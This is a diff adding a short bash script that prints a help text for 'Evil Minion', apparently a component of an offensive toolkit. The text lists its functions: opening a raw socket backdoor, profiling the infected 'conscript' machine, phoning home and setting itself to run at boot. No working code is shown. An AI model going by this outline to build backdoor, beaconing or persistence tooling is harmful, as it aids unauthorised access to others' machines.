@@ -1,0 +1,25 @@
+#!/bin/bash
+#
+# Regards, the Alveare Solutions society.
+#
+
+cat<<EOF
+# EVIL MINION (v1.0 Explorer)
+
+    * [ DESCRIPTION      ]: Software used during Stage 1 of conscript
+                            recruitment. Uses generic commands to probe
+                            conscript machine.
+    * [ MINION PATH      ]: minions/evil-minion.sh
+    * [ PRIME DIRECTIVES ]:
+        * Open Raw Socket Backdoor
+            * Generated Raw Backdoor script and execute.
+        * Scan Conscript Machine
+            * username
+            * OS
+            * external IPv4
+            * architecture
+            * additional details
+        * Phone Home
+        * Set INIT at boot
+
+EOF
